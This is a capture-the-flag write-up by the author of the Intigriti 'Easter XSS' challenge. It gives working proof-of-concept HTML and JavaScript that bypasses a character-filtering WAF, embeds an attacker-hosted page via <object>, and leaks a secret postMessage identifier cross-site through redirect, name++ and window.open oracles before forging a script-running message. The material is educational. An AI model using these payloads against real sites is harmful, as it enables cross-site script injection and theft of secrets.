# Easter XSS by [@terjanq](https://twitter.com/terjanq)

## A quick look
* Source code consists of two files:
   * [index.html](https://github.com/terjanq/Easter-xss-challenge/blob/main/index.html)
   * [waf.html](https://github.com/terjanq/Easter-xss-challenge/blob/main/waf.html)
* Users can inject html code via: [?error=&lt;h1>Hello!&lt;/h1>](https://challenge-0421.intigriti.io/?error=%3Ch1%3EHello!%3C/h1%3E)
* Input is processed via sandboxed subframe [waf.html](https://challenge-0421.intigriti.io/waf.html)
* Error message disappears after 10 seconds
* The site is not framable due to the `X-Frame-Options: DENY` header
* The goal of the challenge is to trigger an interaction-less XSS on `challenge-0421.intigriti.io`

## TL;DR solutions
* Naive solution with 2 iframes: https://easterxss.terjanq.me/naive-solution.html ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/naive-solution.html)), jump to [*Naive solution*](#naive-solution)
* 37 iframes and `iframe.location++`: https://easterxss.terjanq.me/l-solution.html ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/l-solution.html)), jump to [*More iframes*](#more-iframes)
* 37 iframes and `iframe.name++`: https://easterxss.terjanq.me/n-solution.html ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html)), jump to [*Let's go faster*](#lets-go-faster)
* no iframes and `top.name++`: https://easterxss.terjanq.me/t-solution.html ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/t-solution.html)), jump to [*Dark Arts solution*](#dark-arts-solution)

*Share your time scores on Twitter!*

## How does HTML injection work
A top window sends untrusted data through `postMessage` communication with a sandboxed `waf.html` iframe.
```javascript 
  function addError(str){
      wafIframe.postMessage({
          identifier,
          str
      }, '*');
  }
```
It uses a random `identifier` for proof that the communication is not "intercepted". In response, the WAF sends an object with `safe` attribute determining whether the input is safe or not.
```javascript 
onmessage = e => {
    const identifier = e.data.identifier;
    e.source.postMessage({
        type:'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    },'*');
}
```

**Exposing the identifier allows for forgery of arbitrary HTML from any window context.** 

## Waf bypass
1. The WAF isn't very restrictive and it allows for injection of `onXXX` events. However, it restricts characters appearing there to ones outside of the following: ``" ' ` [ ] { } ( ) =``. This is intended to prevent arbitrary code execution, though the charset is not that restrictive. 
2. It is possible to inject `<object data=//atacker.com></object>` to embed an external site.

## The challenge idea
The idea of the challenge comes from a real WAF bypass I discovered. Although it doesn't seem that arbitrary XSS would be possible from the allowed characters, an attacker could inject the following condition 
> `identifier<variable?leak_true:leak_false`

So, the real goal of the challenge is to somehow **leak the identifier cross-site**. 

One can notice that even though standard assignments are forbidden (because of `=`) it is still possible to assign values with either `++` or `--` which more or less work like `+=1` and `-=1`.

## Naive oracle
Let `attacker.com/poc.html` be the following simple page: 
```html
<iframe name=i_true 
        src=//challenge-0421.intigriti.io/style.css
        onload=process(true)
></iframe>
<iframe name=i_false 
        src=//challenge-0421.intigriti.io/style.css
        onload=process(false)
></iframe>
<script>
  function process(value){
    /* do something with the value */
  }
</script>
```

Then by injecting this onto a challenge page via:

```html
<object name=poc 
        data=//attacker.com/poc.html
        onload=identifier</t/.source?top.poc.i_true.location++:top.poc.i_false.location++
></object>
```

depending on the result of the comparison, either iframe `i_true` or `i_false` will be reloaded. That is because `top.poc.i_true.location++` will assign a URL `//challenge-0421.intigriti.io/NaN` to the iframe. 

*Note that it is important that the frames are same-origin otherwise the redirect attempt would fail.*

## Parameterized oracle
The naive oracle from the previous section only yields boolean value based on a constant string `'t'` written as `identifier</t/.source`. Let's try to parametrize the equation so it could potentially be possible to control each comparison. To smuggle the data we could for example use `location.hash`. The same equation could be then presented as `/#/.source+identifier<location.hash` if the URL fragment is set to `#t`. 

*Appending `#` before the identifier is required because `location.hash` starts with that character*

With that, all we need to do is repeat the process somehow and control `location.hash` in each iteration. 

### Visualization on an example
Let's visualize the technique on this simple example for an identifier `012`.

```
'#012' < '#0' (false)
'#012' < '#1 (true) -> we can deduce that the first character is therefore 0

'#012' < '#00' (false)
'#012' < '#01' (false)
'#012' < '#02' (true) -> the second character is 1

'#012' < '#010' (false)
'#012' < '#011' (false)
'#012' < '#012' (false)
'#012' < '#013' (true) -> the third character is 2
```

With repeating the process we were able to leak the full identifier. 

## Custom loop
With the snippet from `//attacker.com/poc.html` we can easily trigger as many iterations as we want by simply doing `location.reload()` after processing the data. That is because with each reload of the object `onload` event triggers in the injected HTML code. All we need is to store already processed data somewhere (e.g. sessionStorage).

## Hints explained
Before going to the naive solution, let's have a look at the released hints.

> First hint: find the objective!

This was a hint towards `<object>` and figuring that the objective is to leak the identifier.

> Time for another hint! Where to smuggle data?

This was a little bit too early hint but it was hinting towards both `<object data` and reusing some properties such as `location.hash` at later steps.

> Time for another tip! One bite after another!

This tip was about leaking the identifier one byte after another. 

> Here's an extra tip: ++ is also an assignment

It was the most direct hint towards `++`  assignment which helps leak data cross-site.

> "Behind a Greater Oracle there stands one great Identity" (leak it)

Construct a comparison oracle to leak the identifier. 

> Tipping time! Goal < object(ive)

It's a double hint for `identifier < something` and to use `<object`

> Another hint: you might need to unload a custom loop!

Create an artificial loop with `<object onload=` by reloading the object.


## Naive solution
By putting all together we can draft a simple payload of leaking the identifier.

```html
<iframe name=i_true 
        src=//easterxss.terjanq.me/style.css
        onload=process(this,true)
></iframe>
<iframe name=i_false 
        src=//easterxss.terjanq.me/style.css
        onload=process(this,false)
></iframe>
<script>
  // add ~ to the alphabet so the poc works. without it, z would be never detected
  const alph = '0123456789abcdefghijklmnopqrstuvwxyz~'

  // store current index and current identifier in sessionStorage
  let cur_char = parseInt(sessionStorage.getItem('current')) || 0;
  let cur_identifier = sessionStorage.getItem('identifier') || '';
  
  // generate payload
  const top_url = 'https://easterxss.terjanq.me/?error=' + encodeURIComponent(
    `<object name=poc 
            data=${location.href}
            onload=/#/.source+identifier<location.hash?top.poc.i_true.location++:top.poc.i_false.location++
    ></object>`.replace(/\s+/g,' '));

  // start payload
  if(top === window){
      sessionStorage.setItem('current', 0);
      sessionStorage.setItem('identifier', '');
      location = top_url + '#0';
  }

  function process(ifr, value){
    // Skip first onload
    if(!ifr.loaded) {
        ifr.loaded = true 
        return;
    }
    // first less value, means the previous was matched character
    if(value === true){
        // If cur_char is 0, it means that the strings are equal.
        if(cur_char === 0) return solve(cur_identifier);
        cur_identifier += alph[cur_char-1];
        console.log(cur_identifier)
        // store new identifier in sessionStorage and reset cur_char
        cur_char = 0;
        sessionStorage.setItem('identifier', cur_identifier)
    }else{
        // try next character
        cur_char += 1;
    }
    // update sessionStorage, change challenge's URL fragment to check next
    // characters, and reload the window to trigger onload event again and again
    sessionStorage.setItem('current', cur_char);
    top.location = top_url + '#' + cur_identifier + alph[cur_char]
    location.reload();
  }

  // with leaked identifier execute full blown XSS
  function solve(identifier) {
        top.postMessage({
            type: 'waf',
            identifier,
            str: `<iframe onload="alert(/this_is_flag/)">`,
            safe: true
        }, '*')
    }
  
</script>
```

However, this is slow and might take a few minutes to finish (here with a fast connection it takes 30-60 seconds). But if someone submitted a similar solution, it would most likely be accepted. The above code be accessed here: https://easterxss.terjanq.me/naive-solution.html. 

The overall goal of the challenge was to improve the efficiency of the naive solution. 

## Better loop
Although `location.reload()` was a nice trick to trigger many onload events, it's resource costly. Each reload is rather slow. To fix that, one can use two objects:
```html
<object name=poc data=//attacker.com/poc.html></object>
<object name=xss src=//attacker.com/empty.html onload=XSS></object>
```
and instead of calling `location.reload()` we could call`top.xss.location='//attacker.com/empty.html'` to load a resource from the browser cache very efficently, or even better, load an empty blob which also has the origin `attacker.com`: 
```js
top.xss.location = URL.createObjectURL(new Blob([], { type: 'text/html'}));
```
The above technique should trigger the `onload` event almost instantly. 

## More iframes
Instead of only using `true` and `false` iframes, we could use 36 iframes, each corresponding to a different character in its name, e.g. `i_[character]`. Then calling `top.poc.i_t.location++` leaks the information about the character `t` via redirecting a specific iframe. To make it work we need to tweak the oracle a little bit and use ternary tricks to perform 36 checks. Let's see how this could be done.

```js
/##/.source + identifier < location.hash + /0/.source && !top.x.i_0.location++ && t.j,
/##/.source + identifier < location.hash + /1/.source && !top.x.i_1.location++ && t.j,
...,
/##/.source + identifier < location.hash + /z/.source && !top.x.i_z.location++ && t.j
```

The trick is that we have 36 expressions separated with `,` which makes them execute one after another. 

If the equation `/##/.source+identifier<location.hash+/0/.source` is satisfied then `top.x.i_0.location++` triggers, then `t.j` throws an exception preventing further execution of all the following expressions. Else, the next expression is tested until the equation is satisfied. That way exactly one call is made for every character.

Check out [http://terjanq.me/l-solution.html](http://terjanq.me/l-solution.html) ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/naive-solution.html)) to see the PoC in action. This solution was enough to solve the challenge while respecting all the rules.

## Let's go faster
The solution with using `location++` is dependent on the network speed and for people with a slower connection, 10 seconds might not be enough to finish execution (though it takes less than 3s for me). To remove network jitter I came up with a neat technique that instead does `name++`. For example, `top.poc.i_3.name++` would change the iframe's name to `NaN`.

### But how to detect the name change?
The name change can be detected through repeatedly, for each iframe, checking if every iframe is still accessible via `window['i_[char]']`. If it is not, that means that `top.poc.i_[char].name++` was called. All that is left is to restore the iframe via injecting a new iframe with the original name and remove the changed one for performance benefits. 

This was implemented in [https://easterxss.terjanq.me/n-solution.html](https://easterxss.terjanq.me/n-solution.html) ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html))

## Dark Arts solution
It's also possible to solve the challenge without any popups nor iframes. The trick is really neat and relies on smuggling the data into `top.name`. 

Let's look at the following expressions: 
```js
location.hash + /0/.source < /##/.source + identifier && ++top.name,
location.hash + /1/.source < /##/.source + identifier && ++top.name,
...,
location.hash + /z/.source < /##/.source + identifier && ++top.name
```

If each equation is satisfied then `++top.name` is called which increases the top window's name by 1. If we initially assign `window.name=0` then after each iteration, the number will indicate which character was leaked. Then, by repeating the process, we can leak the whole identifier.

### But how to read the name??
Although it's not possible to directly read `window.name` of a cross-origin resource without reloading the window, there is this a neat trick of brute-guessing it. 

Let's look at: `window.open('//url', 17)`. It tries to open a new popup with the name `17`. But what happens if there is already a window with such a name? Then it attempts to reload it instead. And it's possible to detect whether there was an attempted navigation or a popup. 

*TL;DR:* use a sandboxed iframe to call `window.open()`, that way popups will be blocked, but set `sandbox=allow-top-navigation` to allow top navigation changes. To prevent real navigation from happening one can use an unknown protocol such as `xxxx://non-existent'`. Then the detection could look like:

```js 
async function getTopName() {
    let i = 0;
    // it's just magic. tl;dr chrome and firefox work differently 
    // but this polyglot works for both;
    for (; i < alph.length + 1; i++) {
        let res = await (async () => {
            let x;
            try {
                // shouldn't trigger new navigation
                x = testFrame.open('xxxx://no-trigger', i + lastValue);
                // this is for firefox
                if (x !== null) return 1;
                return;
            } catch (e) {}
        })();
        if (res) break;
    }
    return i + lastValue;
}
```

The full-blown PoC is available here: [https://easterxss.terjanq.me/t-solution.html](https://easterxss.terjanq.me/t-solution.html) ([source](https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html))
